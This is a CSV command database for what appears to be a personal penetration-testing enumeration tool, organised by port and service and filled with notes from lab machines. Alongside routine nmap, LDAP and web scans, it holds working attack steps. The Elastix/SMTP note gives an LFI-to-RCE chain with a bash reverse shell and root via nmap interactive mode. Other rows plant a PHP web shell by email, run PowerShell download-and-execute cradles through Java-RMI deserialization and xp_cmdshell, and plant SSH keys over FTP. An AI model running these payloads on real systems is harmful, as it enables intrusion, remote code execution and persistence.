Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
DNS,53,Domain Name Service,DNS Tool,The first step of DNS enumeration,Modules/SquidsDnsTool.py {IP} {Domain_Name},Verified,1
FTP,21,File Transfer Protocol,Notes,Notes for FTP,"#ftp 10.11.1.8
Anonymous
-bi     <<< so that your put is done via binary

wget --mirror 'ftp://ftp_user:UTDRSCH53c""$6hys@10.10.10.59'
^^to download all dirs and files

wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' 
if PASV transfer is disabled

??are you in a users dir??
mkdir .ssh
    --on kali-- 
        ssh-keygen
        enter, enter, enter
        cd .ssh
        cp id_rsa.pub authorized_keys
cd .ssh
put authorized_keys
!!!now you can ssh as the user who's directory you were in!!!",Verified,1
Ident,113,Identification Protocol,Ident User Enum,Enumerate Users,#apt install ident-user-enum    ident-user-enum {IP} 22 23 139 445 (try all open ports),Verified,1
Kerberos,88,AD Domain Authentication Service,"Pre Creds
",Brute Force to get Usernames,"nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\'{Domain_Name}\',userdb={Big_Userlist} {IP}",Verified,1
Kerberos,88,AD Domain Authentication Service,With Users,Brute Force with Usernames and Passwords,#consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h,Verified,2
Kerberos,88,AD Domain Authentication Service,With Creds,Attempt to get a list of user service principal names,#https://rootsecdev.medium.com/installing-impacket-on-kali-linux-2020-1d9ad69d10bb        GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs,"Unverified
",3
LDAP,389,Lightweight Directory Access Prorocol,Nmap Scan,Scan 389 with Nmap ldap-search script,nmap -p 389 --script ldap-search -Pn {IP},"Unverified
",1
LDAP,389,Lightweight Directory Access Prorocol,LdapSearch,Base LdapSearch,ldapsearch -h {IP} -x,Verified,2
LDAP,389,Lightweight Directory Access Prorocol,LdapSearch Naming Context Dump,Attempt to get LDAP Naming Context,ldapsearch -h {IP} -x -s base namingcontexts,Verified,3
LDAP,389,Lightweight Directory Access Prorocol,LdapSearch Big Dump,Need Naming Context to do big dump,"ldapsearch -h {IP} -x -b ""{Naming_Context}""",Verified,4
MySql,3306,MySql,Nmap Scan,MySql Nmap Scan,"nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306",Verified,1
Nmap,0,Generic Scans,Kickoff Scan,"Quick scan, Version scan, All Port Scan, UDP Scan ran one at a time in order",nmap -Pn {IP} && nmap -Pn -sS -p- {IP} && nmap -sC -sV -Pn {IP} && nmap -p- -Pn {IP} && sudo nmap -Pn -p- -sU {IP},Verified,1
Nmap,0,Generic Scans,Quick Scan,Quick Nmap Scan,nmap {IP},Verified,2
Nmap,0,Generic Scans,Version Scan,Scan for the Version of the Open Ports,nmap -sC -sV {IP},Verified,3
Nmap,0,Generic Scans,All Port Scan,Scan for All Open Ports,nmap -p- -Pn {IP},Verified,4
Nmap,0,Generic Scans,All Vulns Scan,Scan with All SMB Vuln Scripts,"nmap --script smb-vuln* -p 139,445 {IP}",Verified,5
Nmap,0,Generic Scans,Quiet Scan,Scan Quietly,nmap -Pn -sS -p- {IP},Verified,6
Nmap,0,Generic Scans,UDP Scan,Scan for Open UDP Ports,nmap -Pn -p- -sU {IP},Verified,7
Oracle,1521,Oracle Database,Oracle Notes,Notes for Oracle,"#Oracle Notes
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki",Unverified,1
SMB,139,Server Message Block,Enum4Linux,General SMB Scan,enum4linux -a {IP},Verified,1
SMB,139,Server Message Block,Nmap Smb Scan 1,SMB Vuln Scan With Nmap,"nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}",Verified,2
SMB,139,Server Message Block,Nmap Smb Scan 2,SMB Vuln Scan With Nmap (Less Specific),"nmap --script smb-vuln* -Pn -p 139,445 {IP}",Verified,3
SMB,139,Server Message Block,SMB Version Enum,Use TcpDump to get SMB Version,Modules/SmbVersionEnum {IP} 139,Unverified,4
SMB,139,Server Message Block,Handy SMB Tool,Tool To Aid in Manual SMB Enumeration,Modules/SquidsSmbTool.py {IP} {Domain_Name},"Unverified
",5
SMTP,25,Simple Mail Transfer Protocol,Nmap SMTP Scan,SMTP Vuln Scan With Nmap,"nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}",Verified,1
SMTP,25,Simple Mail Transfer Protocol,SMTP User Enum,Enumerate uses with smtp-user-enum,smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP},Verified,2
SMTP,25,Simple Mail Transfer Protocol,SMTP burp notes,SMTP elastix vulverability,"#IN BURP
in repeater replace GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action HTTP/1.1
with GET /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action HTTP/1.1
to verify code execution after &action put &squid=whoami           run it in repeater. this should return asterisk
right click > change execution method
at the end add execution &squid=bash -i >& /dev/tcp/10.10.14.60/3232 0>&1
highlight bash -i >& /dev/tcp/10.10.14.60/3232 0>&1 and hit ""control u"" to encode in url. should look like    bash+-i+>%26+/dev/tcp/10.10.14.60/3232+0>%261
in terminal
    nc -lvnp 3232
in burp
    run
in terminal
    observe your new shell!!
other terminal
    searchsploit -x exploits/php/webapps/18650.py (found by searchsploit elastix)
in terminal
listening on [any] 3232 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.10.7] 49037
bash: no job control in this shell
bash-3.2$ id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
bash-3.2$ whoami
asterisk
bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> whoami
Unknown command (whoami) -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)",Verified,4
SMTP,25,Simple Mail Transfer Protocol,Smtp Manual Enumeration Notes,Enumerate SMTP following a step-by-step Guide,"#telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix
EHLO coolhandsquid.au
250-beep.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY asterisk@localhost  
252 2.0.0 asterisk@localhost
mail from:coolhandsquid@step-child.au
250 2.1.0 Ok
rcpt to:asterisk@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: You got owned
<?php echo system($_REQUEST['squid']); ?>

.
250 2.0.0 Ok: queued as 84C50D92F8
^C
^]
telnet> quit
",Verified,3
SNMP,161,Simple Network Managment Protocol,Snmp Check,Enumerate SNMP,snmp-check {IP},Verified,1
SNMP,161,Simple Network Managment Protocol,OneSixtyOne,Crack SNMP passwords,onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100,Verified,2
Telnet,23,Telnet,Notes,Telnet Notes,"#wireshark to hear creds being passed
tcp.port == 23 and ip.addr != myip",Verified,1
Web,80,Hypertext Transfer Protocol,Quick Web Scan,Nikto and GoBuster on Each Web Port,nikto -host {Web_Proto}://{IP}:{Web_Port} &&&&gobuster dir -w {Small_Dirlist} -u {Web_Proto}://{IP}:{Web_Port} && gobuster dir -w {Big_Dirlist} -u {Web_Proto}://{IP}:{Web_Port},Verified,1
Web,80,Hypertext Transfer Protocol,SQLMap,Tool To Aid in Running SQLMap,Modules/SquidsSqlMapTool.py,Unverified,2
Web,80,Hypertext Transfer Protocol,WFuzz,Tool To Aid in Running WFuzz,Modules/SquidsWfuzzTool.py,Unverified,3
Web,80,Hypertext Transfer Protocol,Nikto,Generic Web Scan,nikto -host {Web_Proto}://{IP}:{Web_Port},Verified,4
Web,80,Hypertext Transfer Protocol,Directory Brute Force Non-Recursive,Non-Recursive Directory Brute Force,gobuster dir -w {Big_Dirlist} -u {Web_Proto}://{IP}:{Web_Port},Verified,5
Web,80,Hypertext Transfer Protocol,Directory Brute Force Recursive,Recursive Directory Brute Force,"python3 dirsearch/dirsearch.py -w {Small_Dirlist} -e php,exe,sh,py,html,pl -f -t 20 -u {Web_Proto}://{IP}:{Web_Port} -r -R 10",Verified,6
Web,80,Hypertext Transfer Protocol,Directory Brute Force CGI,Common Gateway Interface Brute Force,gobuster dir -u {Web_Proto}://{IP}:{Web_Port}/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,Verified,7
Web,80,Hypertext Transfer Protocol,Nmap Web Vuln Scan,Tailored Nmap Scan for web Vulnerabilities,"nmap -vv --reason -Pn -sV -p {Web_Port} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {IP}",Verified,8
Web,80,Hypertext Transfer Protocol,Nmap ShellShock,Test for ShellShock Vulnerability with custom NSE Script,nmap -vv --reason -Pn -sV -p {Web_Port} --script=Modules/http-shellshock.nse {IP},Verified,9
WebApp,80,Hypertext Transfer Protocol,WPScan,Enumerate WordPress,"wpscan --url {Web_Proto}://{IP} --enumerate ap,at,cb,dbe && wpscan --url {Web_Proto}://{IP} --enumerate u,tt,t,vp --passwords {Big_Passwordlist} -e ",Verified,1
WebApp,80,Hypertext Transfer Protocol,Drupal,Drupal Notes,#git clone https://github.com/immunIT/drupwn.git for low hanging fruit and git clone https://github.com/droope/droopescan.git for the deeper shit,Verified,2
WebApp,80,Hypertext Transfer Protocol,Joomla,Joomla Notes,#joomlavs.rb and joomblah on github are both incredibly handy,Verified,3
Java-RMI,1100,Java Remote Method Invocation,Nmap,Dump register of java-rmi instance,nmap -sC -sV -Pn {IP} -p 1100,Verified,1
Java-RMI,1100,Java Remote Method Invocation,Notes,Notes for BaRMIe,"#nmap -sC -sV -Pn 10.11.1.73 -p 1100 
    may dump the reg of the java-rmi instance. If this is the case the machine may be vulnerable to a deserializaion exploit.
    BaRMIe.jar is the way to go to directly exploit this vulnerability.
    https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01      is where the latest build is hosted, pre-built
    
useage
    java -jar BaRMIe_v1.01.jar -attack 10.11.1.73 1100
    target select)          1
    available attacks)    1 (illegal bind deserialization)
    payloads)                1 (Apache Common Collections 3.1 worked for me, others may also work)
    OS Command)         powershell.exe -command ""IEX(new-object net.webclient).downloadstring('http://192.168.119.167:80/3232.ps1')""
    
    enjoy your system shell!",Verified,2
SQL,1433,Structured Query Language,Notes,Notes for sqsh,"#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
    xp_cmdshell ‘whoami’
    go

2. try to turn component back on
    EXEC SP_CONFIGURE 'xp_cmdshell' , 1
    reconfigure
    go
    xp_cmdshell ‘whoami’
    go

3. 'advanced' turn it back on
    EXEC SP_CONFIGURE 'show advanced options', 1
    reconfigure
    go
    EXEC SP_CONFIGURE 'xp_cmdshell' , 1
    reconfigure
    go
    xp_cmdshell 'whoami'
    go




xp_cmdshell ""powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')""
",Verified,1
NFS,2049,Network File System,Notes,Notes for NFS,"#apt install nfs-common
showmount 10.10.10.180      ~or~showmount -e 10.10.10.180
    should show you available shares (example /home)
    
mount -t nfs -o ver=2 10.10.10.180:/home /mnt/
cd /mnt
nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in",Verified,1
WinRM,5985,Windows Remote Managment,Evil-WinRM Notes,Evil-WinRM is for rev shelling,"#sudo gem install winrm winrm-fs colorize stringio 
git clone https://github.com/Hackplayers/evil-winrm.git 
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’



https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/


ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`",Verified,1
WinRM,5985,WIndows Remote Managment,Evil-WinRM with Python3,Evil-WinRM with python,"#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))",Verified,2
